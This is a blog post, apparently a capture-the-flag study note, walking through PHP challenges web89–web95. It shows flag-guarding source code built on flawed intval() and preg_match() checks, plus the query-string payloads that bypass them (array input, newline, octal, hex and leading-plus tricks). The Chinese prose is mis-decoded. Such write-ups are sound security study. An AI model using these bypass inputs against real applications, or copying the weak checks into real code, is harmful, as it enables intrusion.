<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="P1taya">
    
    <title>
        
            PHPç‰¹æ€§ |
        
        P1taya
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/images/p1taya.jpg">
    
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/font/css/regular.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/font/css/solid.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/font/css/brands.min.css">
    
        
            
                
<link rel="stylesheet" href="/css/demo1.css">

            
        
    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"äººåçš„è‹¦å°šä¸”è¿˜èƒ½å…‹æœ || äººå‰çš„å°Šä¸¥å´æ— æ¯”è„†å¼±","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"jsdelivr"},"pjax":{"enable":false},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]},"root":"","source_data":{"links":[{"name":"å°é»„dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"ğŸ¶ç‹—andçŒ«","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]},"version":"4.1.1"}
    KEEP.language_ago = {"second":"%s ç§’å‰","minute":"%s åˆ†é’Ÿå‰","hour":"%s å°æ—¶å‰","day":"%s å¤©å‰","week":"%s å‘¨å‰","month":"%s ä¸ªæœˆå‰","year":"%s å¹´å‰"}
    KEEP.language_code_block = {"copy":"å¤åˆ¶ä»£ç ","copied":"å·²å¤åˆ¶","fold":"æŠ˜å ä»£ç å—","folded":"å·²æŠ˜å "}
    KEEP.language_copy_copyright = {"copy":"å¤åˆ¶ç‰ˆæƒä¿¡æ¯","copied":"å·²å¤åˆ¶","title":"åŸæ–‡æ ‡é¢˜","author":"åŸæ–‡ä½œè€…","link":"åŸæ–‡é“¾æ¥"}
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/p1taya.jpg">
                </a>
            
            <a class="site-name border-box" href="/">
               P1taya
            </a>
        </div>

        <div class="right border-box">
            <div class="pc">
                <ul class="menu-list">
                    
                        
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                
                                    <i class="menu-icon fa-solid fa-home"></i>
                                
                                é¦–é¡µ
                            </a>
                        </li>
                    
                        
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                
                                    <i class="menu-icon fa-solid fa-box-archive"></i>
                                
                                å½’æ¡£
                            </a>
                        </li>
                    
                        
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                
                                    <i class="menu-icon fa-solid fa-layer-group"></i>
                                
                                åˆ†ç±»
                            </a>
                        </li>
                    
                        
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                
                                    <i class="menu-icon fa-solid fa-link"></i>
                                
                                å‹é“¾
                            </a>
                        </li>
                    
                        
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                
                                    <i class="menu-icon fa-solid fa-user-graduate"></i>
                                
                                å…³äº
                            </a>
                        </li>
                    
                        
                        <li class="menu-item">
                            <a class=""
                               href="/photos"
                            >
                                
                                    <i class="menu-icon fa-solid fa-image"></i>
                                
                                ç›¸å†Œ
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas search fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/"
                    >é¦–é¡µ</a>
                </li>
            
                
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives"
                    >å½’æ¡£</a>
                </li>
            
                
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories"
                    >åˆ†ç±»</a>
                </li>
            
                
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links"
                    >å‹é“¾</a>
                </li>
            
                
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about"
                    >å…³äº</a>
                </li>
            
                
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/photos"
                    >ç›¸å†Œ</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        PHPç‰¹æ€§
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/images/p1taya.jpg">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">P1taya</span>
                                
                                    <span class="author-badge">Lv4</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2022-03-21 21:23:21</span>
            </span>

            <span class="meta-info-item post-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="datetime" data-updated="Wed Apr 17 2024 16:43:00 GMT+0800">2024-04-17 16:43:00</span>
            </span>
        

        
            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="post-category-ul">
                    
                            <li class="category-item"><a href="/categories/%E5%AD%A6%E4%B9%A0/">å­¦ä¹ </a></li>
                        
                    
                </ul>
            </span>
        

        

        
        
            <span class="meta-info-item post-wordcount">
                <i class="icon fas fa-file-word"></i>&nbsp;<span>9.5k å­—</span>
            </span>
        
        
            <span class="meta-info-item post-min2read">
                <i class="icon fas fa-clock"></i>&nbsp;<span>47 åˆ†é’Ÿ</span>
            </span>
        
        
            <span class="meta-info-item post-pv">
                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
            </span>
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body">
                    

                    <h1 id="PHPç‰¹æ€§"><a href="#PHPç‰¹æ€§" class="headerlink" title="PHPç‰¹æ€§"></a>PHPç‰¹æ€§</h1><p>phpç‰¹æ€§è¿™ä¸ªä¸œè¥¿å¾ˆæ‚ï¼Œè¦†ç›–çš„å†…å®¹ä¹Ÿå¾ˆå¤šï¼Œéƒ½æ˜¯ä¸€äº›é›¶ç¢çš„çŸ¥è¯†ç‚¹ï¼Œè¿™æ¬¡æ­£å¥½å€Ÿè¿™ä¸ªåˆ·é¢˜çš„æœºä¼šï¼Œåšä¸€ä¸ªå°å¤ä¹ </p>
<h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ<code>preg_match(&quot;/[0-9]/&quot;, $num</code>è¿‡æ»¤äº†æ•°å­—ï¼Œä½†æ˜¯</p>
<p>æˆ‘ä»¬è¦è®©<code>intval($num)</code>ä¸ºçœŸï¼Œè¿™é¢˜è€ƒçš„å°±æ˜¯<code>intval</code>çš„ç‰¹æ€§</p>
<p><strong>intval()çš„æµ‹è¯•</strong></p>
<blockquote>
<p>è¿”å›å€¼<br>æˆåŠŸæ—¶è¿”å› var çš„ integer å€¼ï¼Œå¤±è´¥æ—¶è¿”å› 0ã€‚ç©ºçš„ array è¿”å› 0ï¼Œéç©ºçš„ array<br>è¿”å› 1ã€‚ </p>
</blockquote>
<p>æµ‹è¯•äº†ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo intval(1234);  //1234</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo intval(042);  //34  0å¼€å¤´çš„ï¼Œå½“æˆäº†8è¿›åˆ¶</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo intval(0x1a);  //26 0xå¼€å¤´ï¼Œå½“æˆ16è¿›åˆ¶</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo intval(3e3);  //3000 ç§‘å­¦è®¡æ•°æ³• 3 X 10çš„ä¸‰æ¬¡æ–¹</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo intval(&#x27;3e3&#x27;);  //3000</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo intval(&quot;1234a&quot;);  //1234</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo intval(4.2); //è½¬åŒ–ä¸ºæ•´æ•°</span><br></pre></td></tr></table></figure>

<p>å›åˆ°é¢˜ç›®</p>
<p>å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=a</span><br></pre></td></tr></table></figure>



<h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>ä¸ä¸Šé¢˜ç±»ä¼¼ï¼Œä½†è¿™æ¬¡æ²¡è¿‡æ»¤æ•°å­—</p>
<p>è¿™é‡Œåˆè¦è¯´ä¸€ä¸‹<code>intval</code>çš„ç›¸å…³ç‰¹æ€§</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval ( mixed $var [, int $base = 10 ] )</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¦‚æœ <code>base</code> æ˜¯ 0ï¼Œé€šè¿‡æ£€æµ‹ <code>var</code> çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š</p>
<ul>
<li>å¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† â€œ0xâ€ (æˆ– â€œ0Xâ€) çš„å‰ç¼€ï¼Œä½¿ç”¨ 16 è¿›åˆ¶ (hex)ï¼›å¦åˆ™ï¼Œ</li>
<li>å¦‚æœå­—ç¬¦ä¸²ä»¥ â€œ0â€ å¼€å§‹ï¼Œä½¿ç”¨ 8 è¿›åˆ¶(octal)ï¼›å¦åˆ™ï¼Œ</li>
<li>å°†ä½¿ç”¨ 10 è¿›åˆ¶ (decimal)ã€‚</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">intval(&#x27;4476a&#x27;,0)=4476</span><br><span class="line">intval(&#x27;010574&#x27;,0)=4476</span><br><span class="line">intval(&#x27;0x117c&#x27;,0)=4476</span><br></pre></td></tr></table></figure>

<p>ä¸Šè¿°ä¸‰ä¸­å‡èƒ½ç»•è¿‡</p>
<h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">show_source(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$a=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;</span><br><span class="line">    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;</span><br><span class="line">        echo &#x27;hacker&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;nonononono&#x27;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ <code>æ­£åˆ™åŒ¹é…ä¿®é¥°ç¬¦</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">i ä¸åŒºåˆ†(ignore)å¤§å°å†™ï¼›</span><br><span class="line">g å…¨å±€(global)åŒ¹é…</span><br><span class="line">m å¤š(more)è¡ŒåŒ¹é…</span><br><span class="line">s ç‰¹æ®Šå­—ç¬¦åœ†ç‚¹ . ä¸­åŒ…å«æ¢è¡Œç¬¦</span><br><span class="line">U åªåŒ¹é…æœ€è¿‘çš„ä¸€ä¸ªå­—ç¬¦ä¸²;ä¸é‡å¤åŒ¹é…; </span><br><span class="line">//ä¿®æ­£ç¬¦:x å°†æ¨¡å¼ä¸­çš„ç©ºç™½å¿½ç•¥; </span><br><span class="line">//ä¿®æ­£ç¬¦:A å¼ºåˆ¶ä»ç›®æ ‡å­—ç¬¦ä¸²å¼€å¤´åŒ¹é…;</span><br><span class="line">//ä¿®æ­£ç¬¦:D å¦‚æœä½¿ç”¨$é™åˆ¶ç»“å°¾å­—ç¬¦,åˆ™ä¸å…è®¸ç»“å°¾æœ‰æ¢è¡Œ; </span><br><span class="line">//ä¿®æ­£ç¬¦:e é…åˆå‡½æ•°preg_replace()ä½¿ç”¨, å¯ä»¥æŠŠåŒ¹é…æ¥çš„å­—ç¬¦ä¸²å½“ä½œæ­£åˆ™è¡¨è¾¾å¼æ‰§è¡Œ;  </span><br></pre></td></tr></table></figure>

<p><code>(preg_match(&#39;/^php$/im&#39;, $a))</code>è¿™ä¸ªåŒ¹é…ä»¥phpå¼€å¤´çš„å­—ç¬¦ä¸²å¹¶ä¸”å¤šè¡ŒåŒ¹é…</p>
<p><code>(preg_match(&#39;/^php$/i&#39;, $a))</code>è¿™ä¸ªä¹Ÿæ˜¯åŒ¹é…ä»¥phpå¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œä½†ä¸æ”¯æŒå¤šè¡ŒåŒ¹é…ï¼Œåªèƒ½åŒ¹é…ä¸€è¡Œ</p>
<blockquote>
<p>preg_match() åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…å å°†ä¼šåœæ­¢æœç´¢ã€‚preg_match_all() ä¸åŒäºæ­¤ï¼Œå®ƒä¼šä¸€ç›´æœç´¢subject ç›´åˆ°åˆ°è¾¾ç»“å°¾</p>
</blockquote>
<p><code>%0a</code>æ¢è¡Œï¼Œç›¸å½“äºenter</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0aphp</span><br><span class="line">æˆ–?cmd=php%0a1   (ä½†php%0aä¸è¡Œ)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘æœ‰ä¸ªå°å°çš„ç–‘æƒ‘ç‚¹ï¼Œé’ˆå¯¹ç¬¬ä¸€ä¸ª <code>%0aphp</code>æ˜¾ç„¶è¿™é‡Œæ˜¯åŒ¹é…çš„ç¬¬ä¸€è¡Œï¼Œç¬¬äºŒä¸ªpayload <code>php%0a1</code>ï¼Œæ˜¾ç„¶è¿™é‡ŒåŒ¹é…çš„æ˜¯ç¬¬äºŒè¡Œï¼Œæ‰€ä»¥å…·ä½“çš„åŒ¹é…æœºåˆ¶æœ‰ç‚¹æ²¡æ‡‚</p>
<p>è¯·å‡äº†ä¸€ä¸‹ç¾¤é‡Œçš„å¸ˆå‚…è¿™é‡Œä¸»è¦è·Ÿ<code>^php$</code>è¿™ä¸ªæœ‰å…³ï¼Œ<code>(preg_match(&#39;/^php$/i&#39;, $a))</code>è¿™ä¸ªä»¥ä¸€æ•´è¡Œä¸ºä¸€ä¸ªæ•´ä½“è¿›è¡Œåˆ¤æ–­ï¼Œç»è¿‡æµ‹è¯•è¿™ä¸ªåªåŒ¹é…ç¬¬ä¸€è¡Œ</p>
<h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)==4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>intval()å‡½æ•°å¦‚æœ$baseä¸º0åˆ™$varä¸­å­˜åœ¨å­—æ¯çš„è¯é‡åˆ°å­—æ¯å°±åœæ­¢è¯»å– ä½†æ˜¯eè¿™ä¸ªå­—æ¯æ¯”è¾ƒç‰¹æ®Šï¼Œå¯ä»¥åœ¨PHPä¸­ä¸æ˜¯ç§‘å­¦è®¡æ•°æ³•</p>
</blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨eç»•è¿‡ä¹Ÿå¯ä»¥ç”¨äºŒè¿›åˆ¶ï¼ˆ0bï¼‰ï¼Œåå…­è¿›åˆ¶ï¼ˆ0xï¼‰ç»•è¿‡</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num=0b1000101111100</span><br><span class="line">?num=0x117c</span><br><span class="line">?num=4476e123</span><br></pre></td></tr></table></figure>



<h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)==4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>

<p>æ¯”ä¸Šä¸€é¢˜å¤šè¿‡æ»¤äº†ä¸€ä¸ªå­—æ¯ï¼Œè¿™æ ·æˆ‘ä»¬eå’ŒäºŒè¿›åˆ¶ï¼Œåå…­è¿›åˆ¶éƒ½ç”¨ä¸äº†ï¼Œ</p>
<p>å…«è¿›åˆ¶æ˜¯ä»¥æ•°å­—0å¼€å¤´çš„ï¼Œåˆšå¥½å¯ä»¥ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=010574</span><br></pre></td></tr></table></figure>



<h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€é¢˜ç›¸å¯¹äºä¸Šä¸€é¢˜ï¼Œä¸è®©æ•°å­—0å‡ºç°åœ¨ç¬¬ä¸€ä½,è€Œä¸”ç¬¬ä¸€ä¸ªifæ˜¯<code>===</code>å¼ºæ¯”è¾ƒ</p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨å°æ•° <code>4476.0</code>ç»•è¿‡ æˆ–è€…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=4476.0</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åœ¨å‰é¢åŠ ä¸Šä¸€ä¸ªåŠ å·ï¼Œå½“ç©ºæ ¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num=+010574</span><br><span class="line">?num= 010574//ç©ºæ ¼ä¹Ÿå¯ä»¥</span><br></pre></td></tr></table></figure>



<h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç¬¬ä¸€ä¸ªåˆ¤æ–­åˆæ¢æˆå¼±æ¯”è¾ƒäº†ï¼Œåªèƒ½ç”¨ ç©ºæ ¼å’Œ <code>+</code> ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num= 010574</span><br><span class="line">?num=+010574</span><br></pre></td></tr></table></figure>



